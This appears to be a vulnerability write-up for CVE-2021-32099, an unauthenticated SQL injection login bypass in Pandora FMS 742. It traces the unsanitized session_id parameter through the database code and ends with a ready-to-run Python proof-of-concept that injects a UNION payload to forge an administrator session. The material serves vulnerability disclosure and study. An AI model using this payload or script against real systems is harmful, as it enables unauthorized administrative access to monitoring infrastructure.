# CVE-2021-32099

## Table of Contents

- [1. Description](#1-description)
- [2. How does PandoraFMS handle an unauthenticated access?](#2-how-does-pandorafms-handle-an-unauthenticated-access)
    - [2.1. Attack vector at /include/chart_generator.php](#21-attack-vector-at-includechart_generatorphp)
    - [2.2. Flow to construct SQL statement](#22-flow-to-construct-sql-statement)
- [3. SQL Injection to bypass the administrator authentication](#3-sql-injection-to-bypass-the-administrator-authentication)
- [4. Proof of Concept](#4-proof-of-concept)
- [5. References](#5-references)

## 1. Description

A SQL injection vulnerability in the pandora_console component of Artica Pandora FMS 742 allows an unauthenticated attacker to upgrade his unprivileged session via the `/include/chart_generator.php` `session_id` parameter, leading to a login bypass.

## 2. How does PandoraFMS handle an unauthenticated access?

### 2.1. Attack vector at `/include/chart_generator.php`

Let’s have a look at how user input is processed when access the endpoint:
- http://127.0.0.1:1337/pandora_console/include/chart_generator.php

<b><span style="color:red">/include/chart_generator.php</span></b>

```php
[...]
// Try to initialize session using existing php session id.
$user = new PandoraFMS\User(['phpsessionid' => $_REQUEST['session_id']]);
if (check_login(false) === false) {
    // Error handler.
    ?>
[...]
```

As you can see, the user's input `$_REQUEST['session_id']` is passed to the constructor of the class `PandoraFMS\User` without any sanitization. Let's see what happen inside this class.

<b><span style="color:red">/include/lib/User.php</span></b>

```php
class User
{
    public $idUser;
    public $sessions = [];
    public function __construct($data) {
        global $config;

        // Unset user.
        unset($config['id_usuario']);
        unset($_SESSION['id_usuario']);

        if (is_array($data) === true) {
            if (isset($data['phpsessionid']) === true) {
                $this->sessions[$data['phpsessionid']] = 1;
                $info = \db_get_row_filter(
                    'tsessions_php',
                    ['id_session' => $data['phpsessionid']]
                );

                if ($info !== false) {
                    // Process.
                    $session_data = session_decode($info['data']);
                    $this->idUser = $_SESSION['id_usuario'];

                    // Valid session.
                    return $this;
                }
                return null;
            }
            [...]
        }
    }
}
```

Inside the constructor of the class `PandoraFMS\User`, user's input then is passed to `db_get_row_filter`. At this point, the chain of backend processing functions is called in sequence to process the user's input data. Finally, it calls `session_decode($info['data'])` to validate the data returned from the database.

### 2.2. Flow to construct SQL statement

We will analyze the execution flow of the payload <b>?session_id=XXX</b>. Below is the processing flow I found after a period time of debugging:

- **The Big Picture:**

```mermaid
flowchart TD
    subgraph **Functions Call Flow**
    A((db_get_row_filter)) -- "(1)" --> B[mysql_db_get_row_filter]
    B                      -- "(2)" --> C[mysql_db_format_array_where_clause_sql]
    C                      -- "(3)" --> B
    B                      -- "(4)" --> D[mysql_db_get_row_sql]
    D                      -- "(5)" --> E[mysql_db_get_all_rows_sql]
    E                      -- "(6)" --> F[(mysql_db_process_sql)]
    end
    subgraph **Data Flow**
    AA["`
        <b><span style="color:cyan">$table:</span></b> tsessions_php
        <b><span style="color:cyan">$filter:</span></b> [id_session => <b><span style="color:red">XXX</span></b>]
    `"] -- "(1)" --> BB["`
        <b><span style="color:cyan">$where_join:</span></b> AND
        <b><span style="color:cyan">$table:</span></b> tsessions_php
        <b><span style="color:cyan">$filter:</span></b> [id_session => <b><span style="color:red">XXX</span></b>]
    `"]

    BB  -- "(2)" --> CC["`
        <b><span style="color:cyan">$table:</span></b> tsessions_php
        <b><span style="color:cyan">$where_join:</span></b> AND
        <b><span style="color:cyan">$filter:</span></b>
        WHERE id_session = '<b><span style="color:red">XXX</span></b>'
    `"]

    CC -- "(3)" --> DD[("`
        <b><span style="color:cyan">$sql:</span></b>
        <b><span style="color:green">
                SELECT * FROM tsessions_php  WHERE id_session = '<b><span style="color:red">XXX</span></b>'
        </span></b>
    `")]
    end
```


- **The root cause:** The user's input is not thoroughly sanitized during the creation of the `WHERE` clause of the SQL statement.
    - <b><span style="color:red">mysql_db_format_array_where_clause_sql:</span></b> Constructing `WHERE` clause
        ```php
        // include/db/mysql.php
        function mysql_db_format_array_where_clause_sql($values, $join='AND', $prefix=false) {
            [...]
            // At this point:
            // $values: [ id_session => "XXX" ]
            
            foreach ($values as $field => $value) {
                $query .= sprintf("%s = '%s'", $field, $value);
            }

            [...]
            return (! empty($query) ? $prefix : '').$query.$group.$order.$limit.$offset;
            // => Return: " WHERE `id_session` = 'XXX'"
        }
        ```
    - <b><span style="color:red">mysql_db_get_row_filter:</span></b> Constructing the final SQL statement
        ```php
        // include/db/mysql.php
        function mysql_db_get_row_filter($table, $filter, $fields=false, $where_join='AND', $historydb=false)
        {
            [...]
            if (is_array($filter)) {
                $filter = db_format_array_where_clause_sql($filter, $where_join, ' WHERE ');
                // After this line:
                // $filter = " WHERE `id_session` = 'XXX'"
            }
            [...]

            $sql = sprintf('SELECT %s FROM %s %s', $fields, $table, $filter);
            // After this line:
            // $sql = "SELECT * FROM tsessions_php  WHERE `id_session` = 'XXX'"

            return db_get_row_sql($sql, $historydb); // Now connect to DB and execute SQL statement.
        }
        ```

## 3. SQL Injection to bypass the administrator authentication

First, we need to determine how the admin's `id_session` is stored in the database:

<p align="center"> </p>

Next, we try to access `include/chart_generator.php?session_id=ua74ldrjn4mmam90git1jvkcon` and debug to see what we need to become administrator:

- At this point, we can use SQL Injection to control the value of `$info` (which is return from `db_get_row_filter`)

    <p align="center"> </p>

- Next, the `session_decode` is called to deserialize the data inside `$info['data']`, the expected result is an array that would be stored in global variable `$_SESSION`.

    <p align="center"> </p>

- Finally, admin privileges are determined by checking if `$_SESSION['id_usuario'] == "admin"`.

Now we need to build a SQLi payload such that when the `db_get_row_filter` function is called, it will return the result: `$info['data'] = id_usuario|s:5:"admin";`

This can be easily achieved by using Union-based SQLi attack like this:

<p align="center"> </p>

## 4. Proof of Concept

```python
import requests
import argparse

s = requests.Session()
def sqli_to_gain_session_admin(base_url: str) -> str:
    """ CVE-2021-32099: SQL Injection to gain session admin 
        Args:
            `base_url`: Base URL of the application (Ex: http://localhost:8080/pandora_console)
        Returns: 
            `id_session`: The session with admin privileges
    """

    # Step 1: Init Access to get a "NULL" `id_session`
    res = s.get(
        url=f"{base_url}/include/chart_generator.php",
    )
    id_session = res.cookies.get("PHPSESSID")
    print(f"[*] First get `id_session` with NULL privilege: {id_session}")

    # Step 2: SQL Injection to gain session admin
    res = s.get(
        url=f"{base_url}/include/chart_generator.php",
        params={
            "session_id": "' UNION SELECT '1',2,'id_usuario|s:5:\"admin\";"
        }
    )
    id_session = res.cookies.get("PHPSESSID")
    print(f"[*] Then perform SQL Injection to gain admin privilege...")

    # Step 3: Verify the session
    if "Pandora FMS Graph ( - )" not in res.text:
        print("[-] Failed to gain admin session")
    else:
        print("[+] Successfully gained admin session!!!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='PoC for CVE-2021-32099')
    parser.add_argument('-u', '--url', type=str, help='Base URL of the application (Ex: http://localhost:8080/pandora_console)', required=True)
    args = parser.parse_args()

    sqli_to_gain_session_admin(args.url)
```

https://github.com/user-attachments/assets/971eb90a-c227-481e-ad6c-148bced3bdc3

## 5. References

- https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/
